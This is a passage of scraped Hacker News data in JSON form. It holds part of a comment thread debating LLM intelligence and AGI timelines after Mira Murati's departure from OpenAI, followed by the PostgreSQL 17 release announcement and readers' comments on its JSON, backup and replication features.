conspiracy theory quota for 2024 in one comment. reply kolbe 18 hours agorootparentI don't think Gates has much influence on Microsoft these days. reply basementcat 18 hours agorootparentHe controls approximately 1% of the voting shares of MSFT. reply kolbe 18 hours agorootparentAnd I would argue his \"soft power\" is greatly diminished as well reply PoignardAzur 13 hours agorootparentprevIt's kinda cool as a conspiracy theory. It's just reasonable enough if you don't know any of the specifics. And the incentives mostly make sense, if you don't look too closely. reply petre 21 hours agorootparentprev> it's possible that we will have superintelligence in a few thousand days Sure, a few thousand days and a few trillion $ away. We'll also have full self driving next month. This is just like the fusion is the energy of the future joke: it's 30 years away and it will always be. reply actionfromafar 20 hours agorootparentNow it’s 20 years away! It took 50 years for it to go from 30 to 20 years away. So maybe, in another 50 years it will be 10 years away? reply theGnuMe 16 hours agorootparentprevTo paraphrase a notable example: We will have full self driving capability next year.. reply blihp 17 hours agoparentprevThis was the company that made all sorts of noise about how they couldn't release GPT-2 to the public because it was too dangerous[1]. While there are many very useful applications being developed, OpenAI's main deliverable appears to be hype that I suspect when it's all said and done they will fail to deliver on. I think the main thing they are doing quite successfully is cashing in on the hype before people figure it out. [1] https://slate.com/technology/2019/02/openai-gpt2-text-genera... reply johnfn 17 hours agorootparentGPT-2 and descendants have polluted the internet with AI spam. I don't think that this is too unreasonable of a claim. reply shmatt 22 hours agoparentprevI feel like this is stating the obvious - but i guess not to many - but a probabilistic syllable generator is not intelligence, it does not understand us, it cannot reason, it can only generate the next syllable It makes us feel understood in the same ways John Edward used to in daytime tv, its all about how language makes us feel true AGI...unfortunately we're not even close reply lumenwrites 18 hours agorootparent\"Intelligence\" is a poorly defined term prone to arguments about semantics and goalpost shifting. I think it's more productive to think about AI in terms of \"effectiveness\" or \"capability\". If you ask it, \"what is the capital of France?\", and it replies \"Paris\" - it doesn't matter whether it is intelligent or not, it is effective/capable at identifying the capital of France. Same goes for producing an image, writing SQL code that works, automating some % of intellectual labor, giving medical advice, solving an equation, piloting a drone, building and managing a profitable company. It is capable of various things to various degrees. If these capabilities are enough to make money, create risks, change the world in some significant way - that is the part that matters. Whether we call it \"intelligence\" or \"probabilistically generaring syllables\" is not important. reply atleastoptimal 18 hours agorootparentprevit can actually solve problems though, its not just an illusion of intelligence if it does the stuff we considered mere years ago sufficient to be intelligent. But you and others keep moving the goalposts as benchmarks saturate, perhaps due to a misplaced pride in the specialness of human intelligence. I understand the fear, but the knee jerk response “its just predicting the next token thus could never be intelligent” makes you look more like a stochastic parrot than these models are. reply ssnistfajen 12 hours agorootparentIt solves problems because it was trained with the solutions to these problems that have been written down a thousand times before. A lot of people don't even consider the ability to solve problems to be a reliable indicator of human intelligence, see the constantly evolving discourse regarding standardized tests. Attempts at autonomous AI agents are still failing spectacularly because the models don't actually have any thought or memory. Context is provided to them via prefixing the prompt with all previous prompts which obviously causes significant info loss after a few interaction loops. The level of intellectual complexity at play here is on par with nematodes in a lab (which btw still can't be digitally emulated after decades of research). This isn't a diss on all the smart people working in AI today, bc I'm not talking about the quality of any specific model available today. reply caconym_ 15 hours agorootparentprevThe \"goalposts\" are \"moving\" because now (unlike \"mere years ago\") we have real AI systems that are at least good enough to be seriously compared with human intelligence. We aren't vaguely speculating about what such an AI system might be like^[1]; we have the real thing now, and we can test its capabilities and see what it is like, what it's good at, and what it's not so good at. I think your use of the \"goalposts\" metaphor is telling. You see this as a team sport; you see yourself on the offensive, or the defensive, or whatever. Neither is conducive to a balanced, objective view of reality. Modern LLMs are shockingly \"smart\" in many ways, but if you think they're general intelligence in the same way humans have general intelligence (even disregarding agency, learning, etc.), that's a you problem. ^[1] I feel the implicit suggestion that there was some sort of broad consensus on this in the before-times is revisionism. reply HeatrayEnjoyer 21 hours agorootparentprevThis overplayed knee jerk response is so dull. reply svara 21 hours agorootparentprevI truly think you haven't really thought this through. There's a huge amount of circuitry between the input and the output of the model. How do you know what it does or doesn't do? Humans brains \"just\" output the next couple milliseconds of muscle activation, given sensory input and internal state. Edit: Interestingly, this is getting downvotes even though 1) my last sentence is a precise and accurate statement of the state of the art in neuroscience and 2) it is completely isomorphic to what the parent post presented as an argument against current models being AGI. To clarify, I don't believe we're very close to AGI, but parent's argument is just confused. reply 015a 19 hours agorootparentDid you seriously just use the word \"isomorphic\"? No wonder people believe AI is the next crypto. reply edouard-harris 10 hours agorootparentIn what way was their usage incorrect? They simply said that the brain just predicts next-actions, in response to a statement that an LLM predicts next-tokens. You can believe or disbelieve either of those statements individually, but the claims are isomorphic in the sense that they have the same structure. reply 015a 4 hours agorootparentIts not that it was used incorrectly: Its that it isn't a word actual humans use, and its one of a handful of dog whistles for \"I'm a tech grifter who has at best a tenuous grasp on what I'm talking about but would love more venture capital\". The last time I've personally heard it spoken was from Beff Jezos/Guillaume Verdon. reply svara 3 hours agorootparentYou know, you can just talk to me about my wording. Where do I meet those gullible venture investors? reply NoGravitas 3 hours agorootparentprevI think we should delve further into that analysis. reply svara 12 hours agorootparentprevWell, AI clearly is the next crypto, haha. Apologies for the wording but I think you got it and the point stands. I'm not a native speaker and mostly use English in a professional science related setting, that's why I sound like that sometimes. isomorphic - being of identical or similar form, shape, or structure (m-w). Here metaphorically applied to the structure of an argument. reply HarHarVeryFunny 16 hours agorootparentprev> There's a huge amount of circuitry between the input and the output of the model Yeah - but it's just a stack of transformer layers. No looping, no memory, no self-modification (learning). Also, no magic. reply HeatrayEnjoyer 6 hours agorootparent>no memory, no self-modification (learning). This is also true of those with advanced Alzheimer's disease. Are they not conscious as well? If we believe they are conscious then memory and learning must not be essential ingredients. reply HarHarVeryFunny 4 hours agorootparentI'm not sure what you're trying to say. I thought we're talking about intelligence, not consciousness, and limitations of the LLM/transformer architecture that limit their intelligence compared to humans. In fact LLMs are not only architecturally limited, but they also give the impression of being far more intelligent than they actually are due to mimicking training sources that are more intelligent than the LLM itself is. If you want to bring consciousness into the discussion, then that is basically just the brain modelling itself and the subjective experience that gives rise to. I expect it arose due to evolutionary adaptive benefit - part of being a better predictor (i.e. more intelligent) is being better able to model your own behavior and experiences, but that's not a must-have for intelligence. reply lewhoo 5 hours agorootparentprevI don't think that's a good example. People with Alzheimer's have, to put it simply, damaged memory, but not complete lack of. We're talking about a situation where a person wouldn't be even conscious of being a human/person unless they were told so as part of the current context window. Right ? reply svara 12 hours agorootparentprevNo looping, but you can unroll loops to a fixed depth and apply the model iteratively. There obviously is memory and learning. Neuroscience hasn't found the magic dust in our brains yet, either. ;) reply HarHarVeryFunny 6 hours agorootparentZero memory inside the model from one input (ie token output) to the next (only the KV cache, which is just an optimization). The only \"memory\" is what the model outputs and therefore gets to re-consume (and even there it's an odd sort of memory since the model itself didn't exactly choose what to output - that's a random top-N sampling). There is no real runtime learning - certainly no weight updates. The weights are all derived from pre-training, and so the runtime model just represents a frozen chunk of learning. Maybe you are thinking of \"in-context learning\", which doesn't update the weights, but is rather the ability of the model to use whatever is in the context, including having that \"reinforced\" by repetition. This is all a poor substitute for what an animal does - continuously learning from experience and exploration. The \"magic dust\" in our brains, relative to LLMs, is just a more advanced and structure architecture, and operational dynamics. e.g. We've got the thalamo-cortical loop, massive amounts of top-down feedback for incremental learning from prediction failure, working memory, innate drives such as curiosity (prediction uncertainty) and boredom to drive exploration and learning, etc, etc. No magic, just architecture. reply svara 3 hours agorootparentI'm not entirely sure what you're arguing for. Current AI models can still get a lot better, sure. I'm not in the AGI in 3 years camp. But, people in this thread are making philosophically very poor points about why that is supposedly so. It's not \"just\" sequence prediction, because sequence prediction is the very essence of what the human brain does. Your points on learning and memory are similarly weak word play. Memory means holding some quantity constant over time in the internal state of a model. Learning means being able to update those quantities. LLMs obviously do both. You're probably going to be thinking of all sorts of obvious ways in which LLMs and humans are different. But no one's claiming there's an artificial human. What does exist is increasingly powerful data processing software that progressively encroaches on domains previously thought to be that of humans only. And there may be all sorts of limitations to that, but those (sequences, learning, memory) aren't them. reply ttul 21 hours agorootparentprevWhile it's true that language models are fundamentally based on statistical patterns in language, characterizing them as mere \"probabilistic syllable generators\" significantly understates their capabilities and functional intelligence. These models can engage in multistep logical reasoning, solve complex problems, and generate novel ideas - going far beyond simply predicting the next syllable. They can follow intricate chains of thought and arrive at non-obvious conclusions. And OpenAI has now showed us that fine-tuning a model specifically to plan step by step dramatically improves its ability to solve problems that were previously the domain of human experts. Although there is no definitive evidence that state-of-the-art language models have a comprehensive \"world model\" in the way humans do, several studies and observations suggest that large language models (LLMs) may possess some elements or precursors of a world model. For example, Tegmark and Gurnee [1] found that LLMs learn linear representations of space and time across multiple scales. These representations appear to be robust to prompting variations and unified across different entity types. This suggests that modern LLMs may learn rich spatiotemporal representations of the real world, which could be considered basic ingredients of a world model. And even if we look at much smaller models like Stable Diffusion XL, it's clear that they encode a rich understanding of optics [2] within just a few billion parameters (3.5 billion to be precise). Generative video models like OpenAI's Sora clearly have a world model as they are able to simulate gravity, collisions between objects, and other concepts necessary to render a coherent scene. As for AGI, the consensus on Metaculus is that it will arrive in 2023. But consider that before GPT-4 arrived, the consensus was that full AGI was not coming until 2041 [3]. The consensus for the arrival date of \"weakly general\" AGI is 2027 [4] (i.e AGI that doesn't have a robotic physical world component). The best tool for achieving AGI is the transformer and its derivatives; its scaling keeps going with no end in sight. Citations: [1] https://paperswithcode.com/paper/language-models-represent-s... [2] https://www.reddit.com/r/StableDiffusion/comments/15he3f4/el... [3] https://www.metaculus.com/questions/5121/date-of-artificial-... [4] https://www.metaculus.com/questions/3479/date-weakly-general... reply PollardsRho 18 hours agorootparent> its scaling keeps going with no end in sight. Not only are we within eyesight of the end, we're more or less there. o1 isn't just scaling up parameter count 10x again and making GPT-5, because that's not really an effective approach at this point in the exponential curve of parameter count and model performance. I agree with the broader point: I'm not sure it isn't consistent with current neuroscience that our brains aren't doing anything more than predicting next inputs in a broadly similar way, and any categorical distinction between AI and human intelligence seems quite challenging. I disagree that we can draw a line from scaling current transformer models to AGI, however. A model that is great for communicating with people in natural language may not be the best for deep reasoning, abstraction, unified creative visions over long-form generations, motor control, planning, etc. The history of computer science is littered with simple extrapolations from existing technology that completely missed the need for a paradigm shift. reply versteegen 16 hours agorootparentThe fact that OpenAI created and released o1 doesn't mean they won't also scale models upwards or don't think it's their best hope. There's been plenty said implying that they are. I definitely agree that AGI isn't just a matter of scaling transformers, and also as you say that they \"may not be the best\" for such tasks. (Vanilla transformers are extremely inefficient.) But the really important point is that transformers can do things such as abstract, reason, form world models and theories of minds, etc, to a significant degree (a much greater degree than virtually anyone would have predicted 5-10 years ago), all learnt automatically. It shows these problems are actually tractable for connectionist machine learning, without a paradigm shift as you and many others allege. That is the part I disagree with. But more breakthroughs needed. reply ttul 4 hours agorootparentTo whit: OpenAI was until quite recently investigating having TSMC build a dedicated semiconductor fab to produce OpenAI chips [1]: (Translated from Chinese) > According to industry insiders, OpenAI originally actively negotiated with TSMC to build a dedicated wafer factory. However, after evaluating the development benefits, it shelved the plan to build a dedicated wafer factory. Strategically, OpenAI sought cooperation with American companies such as Broadcom and Marvell for its own ASIC chips. Development, among which OpenAI is expected to become Broadcom's top four customers. [1] https://money.udn.com/money/story/5612/8200070 (Chinese) Even if OpenAI doesn't build its own fab -- a wise move, if you ask me -- the investment required to develop an ASIC on the very latest node is eye watering. Most people - even people in tech - just don't have a good understanding of how \"out there\" semiconductor manufacturing has become. It's basically a dark art at this point. For instance, TSMC themselves [2] don't even know at this point whether the A16 node chosen by OpenAI will require using the forthcoming High NA lithography machines from ASML. The High NA machines cost nearly twice as much as the already exceptional Extreme Ultraviolet (EUV) machines do. At close to $400M each, this is simply eye watering. I'm sure some gurus here on HN have a more up to date idea of the picture around A16, but the fundamental news is this: If OpenAI doesn't think scaling will be needed to get to AGI, then why would they be considering spending many billions on the latest semiconductor tech? Citations: [1] https://www.phonearena.com/news/apple-paid-twice-as-much-for... [2] https://www.asiabusinessoutlook.com/news/tsmc-to-mass-produc... reply iLoveOncall 20 hours agorootparentprev> Generative video models like OpenAI's Sora clearly have a world model as they are able to simulate gravity, collisions between objects, and other concepts necessary to render a coherent scene. I won't expand on the rest, but this is simply nonsensical. The fact that Sora generates output that matches its training data doesn't show that it has a concept of gravity, collision between object, or anything else. It has a \"world model\" the same way a photocopier has a \"document model\". reply svara 20 hours agorootparentMy suspicion is that you're leaving some important parts in your logic unstated. Such as belief in a magical property within humans of \"understanding\", which you don't define. The ability of video models to generate novel video consistent with physical reality shows that they have extracted important invariants - physical law - out of the data. It's probably better not to muddle the discussion with ill defined terms such as \"intelligence\" or \"understanding\". I have my own beef with the AGI is nigh crowd, but this criticism amounts to word play. reply phatfish 19 hours agorootparentIt feels like if these image and video generation models were really resolving some fundamental laws from the training data they should at least be able to re-create an image at a different angle. reply some1else 18 hours agorootparentprev\"Allegory of the cave\" comes to mind, when trying to describe the understanding that's missing from diffusion models. I think a super-model with such qualifications would require a number of ControlNets in a non-visual domains to be able to encode understanding of the underlying physics. Diffusion models can render permutations of whatever they've seen fairly well without that, though. reply svara 9 hours agorootparentI'm very familiar with the allegory of the cave, but I'm not sure I understand where you're going with the analogy here. Are you saying that it is not possible to learn about dynamics in a higher dimensional space from a lower dimensional projection? This is clearly not true in general. E.g., video models learn that even though they're only ever seeing and outputting 2d data, objects have different sides in a fashio that is consistent with our 3d reality. The distinctions you (and others in this thread) are making is purely one of degree - how much generalization has been achieved, and how well - versus one of category. reply CooCooCaCha 21 hours agorootparentprevI'm not saying you're wrong but you could use this reductive rhetorical strategy to dismiss any AI algorithm. \"It's just X\" is frankly shallow criticism. reply timr 21 hours agorootparentAnd you can dismiss any argument with your response. \"Your argument is just a reductive rhetorical strategy.\" reply CooCooCaCha 20 hours agorootparentSure if you ignore context. \"a probabilistic syllable generator is not intelligence, it does not understand us, it cannot reason\" is a strong statement and I highly doubt it's backed by any sort of substance other than \"feelz\". reply timr 18 hours agorootparentI didn't ignore any more context than you did, but just I want to acknowledge the irony that \"context\" (specifically, here, any sort of memory that isn't in the text context window) is exactly what is lacking with these models. For example, even the dumbest dog has a memory, a strikingly advanced concept model of the world [1], a persistent state beyond the last conversation history, and an ability to reason (that doesn't require re-running the same conversation sixteen bajillion times in a row). Transformer models do not. It's really cool that they can input and barf out realistic-sounding text, but let's keep in mind the obvious truths about what they are doing. [1] \"I like food. Something that smells like food is in the square thing on the floor. Maybe if I tip it over food will come out, and I will find food. Oh no, the person looked at me strangely when I got close to the square thing! I am in trouble! I will have to do it when they're not looking.\" reply CooCooCaCha 17 hours agorootparent> t",
    "originSummary": [],
    "commentSummary": [
      "Mira Murati's departure from OpenAI has ignited discussions about the company's restructuring and future directions.",
      "Speculations include the possibility of departing employees starting new AI safety-focused companies or a shift in OpenAI's focus from AGI (Artificial General Intelligence) development to profit maximization.",
      "The debate also encompasses challenges in AI regulation, the potential for AGI, and the broader implications of AI advancements."
    ],
    "points": 762,
    "commentCount": 552,
    "retryCount": 0,
    "time": 1727292931
  },
  {
    "id": 41657986,
    "title": "PostgreSQL 17",
    "originLink": "https://www.postgresql.org/about/news/postgresql-17-released-2936/",
    "originBody": "Home About Download Documentation Community Developers Support Donate Your account September 26, 2024: PostgreSQL 17 Released! Quick Links About Governance Policies Feature Matrix Donate History Sponsors Contributing Financial Servers Latest News Upcoming Events Past events Press Licence PostgreSQL 17 Released! Posted on 2024-09-26 by PostgreSQL Global Development Group PostgreSQL Project The PostgreSQL Global Development Group today announced the release of PostgreSQL 17, the latest version of the world's most advanced open source database. PostgreSQL 17 builds on decades of open source development, improving its performance and scalability while adapting to emergent data access and storage patterns. This release of PostgreSQL adds significant overall performance gains, including an overhauled memory management implementation for vacuum, optimizations to storage access and improvements for high concurrency workloads, speedups in bulk loading and exports, and query execution improvements for indexes. PostgreSQL 17 has features that benefit brand new workloads and critical systems alike, such as additions to the developer experience with the SQL/JSON JSON_TABLE command, and enhancements to logical replication that simplify management of high availability workloads and major version upgrades. \"PostgreSQL 17 highlights how the global open source community, which drives the development of PostgreSQL, builds enhancements that help users at all stages of their database journey,\" said Jonathan Katz, a member of the PostgreSQL core team. \"Whether it's improvements for operating databases at scale or new features that build on a delightful developer experience, PostgreSQL 17 will enhance your data management experience.\" PostgreSQL, an innovative data management system known for its reliability, robustness, and extensibility, benefits from over 25 years of open source development from a global developer community and has become the preferred open source relational database for organizations of all sizes. System-wide performance gains The PostgreSQL vacuum process is critical for healthy operations, requiring server instance resources to operate. PostgreSQL 17 introduces a new internal memory structure for vacuum that consumes up to 20x less memory. This improves vacuum speed and also reduces the use of shared resources, making more available for your workload. PostgreSQL 17 continues to improve performance of its I/O layer. High concurrency workloads may see up to 2x better write throughput due to improvements with write-ahead log (WAL) processing. Additionally, the new streaming I/O interface speeds up sequential scans (reading all the data from a table) and how quickly ANALYZE can update planner statistics. PostgreSQL 17 also extends its performance gains to query execution. PostgreSQL 17 improves the performance of queries with IN clauses that use B-tree indexes, the default index method in PostgreSQL. Additionally, BRIN indexes now support parallel builds. PostgreSQL 17 includes several improvements for query planning, including optimizations for NOT NULL constraints, and improvements in processing common table expressions (WITH queries). This release adds more SIMD (Single Instruction/Multiple Data) support for accelerating computations, including using AVX-512 for the bit_count function. Further expansion of a robust developer experience PostgreSQL was the first relational database to add JSON support (2012), and PostgreSQL 17 adds to its implementation of the SQL/JSON standard. JSON_TABLE is now available in PostgreSQL 17, letting developers convert JSON data into a standard PostgreSQL table. PostgreSQL 17 now supports SQL/JSON constructors (JSON, JSON_SCALAR, JSON_SERIALIZE) and query functions (JSON_EXISTS, JSON_QUERY, JSON_VALUE), giving developers other ways of interfacing with their JSON data. This release adds more jsonpath expressions, with an emphasis of converting JSON data to a native PostgreSQL data type, including numeric, boolean, string, and date/time types. PostgreSQL 17 adds more features to MERGE, which is used for conditional updates, including a RETURNING clause and the ability to update views. Additionally, PostgreSQL 17 has new capabilities for bulk loading and data exporting, including up to a 2x performance improvement when exporting large rows using the COPY command. COPY performance also has improvements when the source and destination encodings match, and includes a new option, ON_ERROR, that allows an import to continue even if there is an insert error. This release expands on functionality both for managing data in partitions and data distributed across remote PostgreSQL instances. PostgreSQL 17 supports using identity columns and exclusion constraints on partitioned tables. The PostgreSQL foreign data wrapper (postgres_fdw), used to execute queries on remote PostgreSQL instances, can now push EXISTS and IN subqueries to the remote server for more efficient processing. PostgreSQL 17 also includes a built-in, platform independent, immutable collation provider that's guaranteed to be immutable and provides similar sorting semantics to the C collation except with UTF-8 encoding rather than SQL_ASCII. Using this new collation provider guarantees that your text-based queries will return the same sorted results regardless of where you run PostgreSQL. Logical replication enhancements for high availability and major version upgrades Logical replication is used to stream data in real-time across many use cases. However, prior to this release, users who wanted to perform a major version upgrade would have to drop logical replication slots, which requires resynchronizing data to subscribers after an upgrade. Starting with upgrades from PostgreSQL 17, users don't have to drop logical replication slots, simplifying the upgrade process when using logical replication. PostgreSQL 17 now includes failover control for logical replication, making it more resilient when deployed in high availability environments. Additionally, PostgreSQL 17 introduces the pg_createsubscriber command-line tool for converting a physical replica into a new logical replica. More options for managing security and operations PostgreSQL 17 further extends how users can manage the overall lifecycle of their database systems. PostgreSQL has a new TLS option, sslnegotiation, that lets users perform a direct TLS handshakes when using ALPN (registered as postgresql in the ALPN directory). PostgreSQL 17 also adds the pg_maintain predefined role, which gives users permission to perform maintenance operations. pg_basebackup, the backup utility included in PostgreSQL, now supports incremental backups and adds the pg_combinebackup utility to reconstruct a full backup. Additionally, pg_dump includes a new option called --filter that lets you select what objects to include when generating a dump file. PostgreSQL 17 also includes enhancements to monitoring and analysis features. EXPLAIN now shows the time spent for local I/O block reads and writes, and includes two new options: SERIALIZE and MEMORY, useful for seeing the time spent in data conversion for network transmission, and how much memory was used. PostgreSQL 17 now reports the progress of vacuuming indexes, and adds the pg_wait_events system view that, when combined with pg_stat_activity, gives more insight into why an active session is waiting. Additional Features Many other new features and improvements have been added to PostgreSQL 17 that may also be helpful for your use cases. Please see the release notes for a complete list of new and changed features. About PostgreSQL PostgreSQL is the world's most advanced open source database, with a global community of thousands of users, contributors, companies and organizations. Built on over 35 years of engineering, starting at the University of California, Berkeley, PostgreSQL has continued with an unmatched pace of development. PostgreSQL's mature feature set not only matches top proprietary database systems, but exceeds them in advanced database features, extensibility, security, and stability. Links Download Release Notes Press Kit Security Page Versioning Policy Follow @postgresql Donate PoliciesCode of ConductAbout PostgreSQLContact Copyright © 1996-2024 The PostgreSQL Global Development Group",
    "commentLink": "https://news.ycombinator.com/item?id=41657986",
    "commentBody": "PostgreSQL 17 (postgresql.org)388 points by jkatz05 5 hours agohidepastfavorite74 comments kiwicopple 4 hours agoAnother amazing release, congrats to all the contributors. There are simply too many things to call out - just a few highlights: Massive improvements to vacuum operations: \"PostgreSQL 17 introduces a new internal memory structure for vacuum that consumes up to 20x less memory.\" Much needed features for backups: \"pg_basebackup, the backup utility included in PostgreSQL, now supports incremental backups and adds the pg_combinebackup utility to reconstruct a full backup\" I'm a huge fan of FDW's and think they are an untapped-gem in Postgres, so I love seeing these improvements: \"The PostgreSQL foreign data wrapper (postgres_fdw), used to execute queries on remote PostgreSQL instances, can now push EXISTS and IN subqueries to the remote server for more efficient processing.\" reply ellisv 3 hours agoparent> I'm a huge fan of FDW's Do you have any recommendations on how to manage credentials for `CREATE USER MAPPING ` within the context of cloud hosted dbs? reply darth_avocado 1 hour agorootparentIf your company doesn't have an internal tool for storing credentials, you can always store them in the cloud provider's secrets management tool. E.g. Secrets Manager or Secure String in Parameter Store on AWS. Your CI/CD pipeline can pull the secrets from there. reply netcraft 28 minutes agoprevI remember when the json stuff started coming out, I thought it was interesting but nothing I would ever want to rely on - boy was I wrong! It is so nice having json functionality in a relational db - even if you never actually store json in your database, its useful in so many situations. Being able to generate json in a query from your data is a big deal too. Looking forward to really learning json_table reply jackschultz 4 hours agoprevVery cool with the JSON_TABLE. The style of putting json response (from API, created from scraping, ect.) into jsonb column and then writing a view on top to parse / flatten is something I've been doing for a few years now. I've found it really great to put the json into a table, somewhere safe, and then do the parsing rather than dealing with possible errors on the scripting language side. I haven't seen this style been used in other places before, and to see it in the docs as a feature from new postgres makes me feel a bit more sane. Will be cool to try this out and see the differences from what I was doing before! reply 0cf8612b2e1e 33 minutes agoparentA personal rule of mine is to always separate data receipt+storage from parsing. The retrieval is comparatively very expensive and has few possible failure modes. Parsing can always fail in new and exciting ways. Disk space to store the returned data is cheap and can be periodically flushed only when you are certain the content has been properly extracted. reply abyesilyurt 40 minutes agoparentprev> putting json response (from API, created from scraping, ect.) into jsonb column and then writing a view on top to parse That’s a very good idea! reply ellisv 3 hours agoparentprevIt is definitely an improvement on multiple `JSONB_TO_RECORDSET` and `JSONB_TO_RECORD` calls for flattening nested json. reply pestaa 4 hours agoprevVery impressive changelog. Bit sad the UUIDv7 PR didn't make the cut just yet: https://commitfest.postgresql.org/49/4388/ reply 0cf8612b2e1e 39 minutes agoparentI must be missing something because that feels easy to implement. A date seconds + random data in the same way as UUID4. Where is the iceberg complexity? reply lfittl 5 minutes agorootparentIn my understanding it was a timing issue with the UUIDv7 RFC not being finalized before the Postgres 17 feature freeze in early April. Shouldn't be an issue to get this in for Postgres 18, I think. reply ellisv 3 hours agoparentprevI've been waiting for \"incremental view maintenance\" (i.e. incremental updates for materialized views) but it looks like it's still a few years out. reply whitepoplar 1 hour agorootparentThere's always the pg_ivm extension you can use in the meantime: https://github.com/sraoss/pg_ivm reply ellisv 1 hour agorootparentUnfortunately we use a cloud provider to host our databases, so I can only install limited extensions. reply on_the_train 4 hours agoprevMy boss insisted on the switch from oracle to mssql. Because \"you can't trust open source for business software\". Oh the pain reply throw351203910 0 minutes agoparentWhat your boss doesn't realize is your business already depends on FOSS. Here are a few examples: - Do you use any cloud provider? Those platforms are built on top of open source software: Linux, nginx (e.g Cloudflare's edge servers before the rust rewrite), ha-proxy (AWS ELB), etc - Either the software your business builds or depends on probably uses open source libraries (e.g: libc, etc) - The programming languages your business uses directly or indirectly are probably open source My point is that folks that make these kinds of statements have no clue how their software is built or what kind software their business actually depends on. reply bityard 29 minutes agoparentprevI ran into a lot of that 20 years ago, surprised to hear it's still a thing at all given how it's basically common knowledge that most of the Internet and Cloud run on open source software. I once met an older gentleman who was doing IT work for a defense contractor. He seemed nice enough. We were making small talk and I happened to mention that I had recently installed Linux on my computer at home. He tone changed almost immediately and he started ranting about how Linux was pirated source code, stolen from Microsoft, all of it contains viruses, etc. He was talking about the SCO vs Linux lawsuits but of course got absolutely ALL of the details wrong, like which companies were even involved in the lawsuits. He was so far off the deep end that I didn't even try to correct him, I just nodded and smiled and said I was actually running late to be somewhere else... reply gigatexal 4 hours agoparentprevSo from one expensive vendor to another? Your boss seems smart. ;-) What’s the rationale? What do you gain? reply systems 4 hours agorootparentWell, from one VERY expensive vendor, to another considerably less expensive vendor Also, MSSQL have few things going for it, and surprisingly no one seem to be even trying to catch up - Their BI Stacks (PowerBI, SSAS) - Their Database Development (SDK) ( https://learn.microsoft.com/en-us/sql/tools/sql-database-projects/sql-database-projects?view=sql-server-ver16 ) The MSSQL BI stack is unmatched , SSAS is the top star of BI cubes and the second option is not even close SSRS is ok, SSIS is passable , but still both are very decent PowerBI and family is also the best option for Mid to large (not FAANG large, but just normal large) companies And finally the GEM that is database projects, you can program your DB changes declaratively, there is nothing like this in the market and again, no one is even trying The easiest platformt todo evolutionary DB development is MS SQL I really wish someone will implement DB Projects (dacpac) for Postgresql reply kragen 3 hours agorootparentdoes 'bi' mean 'olap'? because the literal expansion 'business intelligence' (or the explanation in the Wikipedia article) is hard to interpret as something that makes sense in contexts like this where you're apparently talking about features of software rather than social practices. the reference to 'bi cubes' makes me think that maybe it means 'olap'? reply systems 2 hours agorootparentDSS became BI became AI At some point in time, Decision Support Systems became Business Intelligence and nowadays this is switching ti AI BI (formerly DSS) is a set of tools that enable Business Analytics , OLAP and technologies that implements OLAP (Cubes and Columnar databases) enables BI reply setr 1 hour agorootparentprevbi tooling is usually report/analysis builders, intended to be consumed by.. business users. More importantly, they're usually also meant to be used by business users to build their own reports in the first place -- although in practice it often ends up going back to IT to maintain/update anyways. Basically anything that competes with excel pivot tables is a bi tool. OLAP/cubes usually underpins bi tooling, since the usecase is almost entirely across-the-board aggregations. reply gigatexal 3 hours agorootparentprevI think so but it’s overloaded and basically used for reporting and analysis stuff. reply gigatexal 3 hours agorootparentprevWhat do you love so about PowerBI? I’ve not looked at it very closely. I’ve worked with Tableau and Looker and LookerPro. All of which seemed fine. Is it a home run if the end users aren’t on Windows or using Excel? I’m thinking about the feature where you can use a SQLServer DB as a data source to Excel. reply bradford 38 minutes agorootparent> What do you love so about PowerBI? For a large portion of my career, the dashboarding solutions I've worked with have followed a similiar model: they provide a presentation layer directly on top of a query of some kind (usually, but not always, a SQL query). This seems like a natural next step for organizations that have a lot of data in one spot, but no obvious way of visualizing it. But, after implementing and maintaining dashboards/reports constructed in this way, big problems start to arise. The core of the problem is that each dashboard/report/visual is tightly coupled to the datasource that's backing it. This tight coupling leads to many problems which I won't enumerate. Power BI is great because it can provide an abstraction layer (a semantic model) on top of the many various data sources that might be pushed into a report. You're free to combine data from Excel with msSql or random Json, and it all plays together nicely in the same report. You can do data cleaning in the import stage, and the dimension/fact-tables pattern has been able to solve the wide variety of challenges that I've thrown at it. All this means that the PowerBI reports I've made have been far more adaptable to changes than the other tightly coupled solutions I've used. (I haven't used Tableau, but my understanding is that it provides similar modeling concepts to decouple the data input from the data origin. I'm not at all familiar with Looker). [disclaimer, I'm a Microsoft Employee (but I don't work in Power BI)] reply gigatexal 3 hours agorootparentprevI got my start in a SQLserver all MS shop. I hated SSIS. I wished I just had something akin to Python and dataframes to just parse things in a data pipeline. Instead I had some graphical tool whose error messages and deployments left a lot to be desired. But SQLServer and Microsoft in general make for good platforms for companies: they’re ubiquitous enough that you won’t find it hard to find engineers to work on your stack, there’s support, etc reply systems 2 hours agorootparentThe key feature of SSIS, is parallel dataflow You can so easily write (and schedule) parallel dataflows in SSIS, to do the same code using a general purpose programming language would be a lot harder Also remember that dataflows are data pipe streams, so SSIS can be very very fast Anyway, there is BIML, which allow you to create SSIS package by writing XML, I personally never used it, mainly because its licensing situation seemed weird to me ( i think BIML is free, but the tool support is not, and MS SSDT doesnt support BIML coding i thinkg) reply gigatexal 1 hour agorootparentYeah I think I never gave it a fair shake. I think — like most things — if understood and used properly it can be amazing. reply wredue 3 hours agorootparentprevSSIS is for integrations, and pandas is definitely not. I’m not sure what you’re trying to do with SSIS that you’re also doing with pandas, but it’s probably wrong. SSIS is far more geared to data warehousing integrations, while pandas would be reading a data warehouse and doing stuff with it. SSIS isn’t really meant for processing incoming data, even if you can kind of hack it together to do that. I will say that when we want “real time” integrations, SSIS is phenomenally bad. But that’s not entirely unexpected for what it is. reply gigatexal 2 hours agorootparentWe don't need to be so pedantic. Python -- as it often is -- would be the glue, it would be the connecting part, and pandas (polars, duckdb, anything really) would be the processing part. Then once processed the outputs would be placed somewhere be it an update to a db table or some other downstream thing. reply sroussey 3 hours agorootparentprevAt least both of these databases support clustered indexes. For decades. reply pphysch 2 hours agorootparentprev> And finally the GEM that is database projects, you can program your DB changes declaratively, there is nothing like this in the market and again, no one is even trying Automatic migration tools have essentially been doing this for a while (e.g. Django migrations). But I agree it would be nice if Postgres had better support built in. reply koolba 1 hour agorootparentDatabase migrations to arrive at a target state are an interesting beast. It’s not just the destination that matters, it’s how you get there. The naive approach of applying whatever DDL you need to turn database schema A into B is not necessarily the one anybody would actually want to run, and in larger deployments it’s most definitely not the one you’d want to run. Intermediate availability and data migration go well beyond simply adding tables or columns. They’re highly application specific. The main improvements in this space are making existing operations CONCURRENT (e.g., like index creation) and minimizing overall lock times for operations that cannot (e.g., adding columns with default values). reply manishsharan 3 hours agorootparentprevMS Azure SQL on is very cheap compared to any other self hosted database including PG and MS SQL. 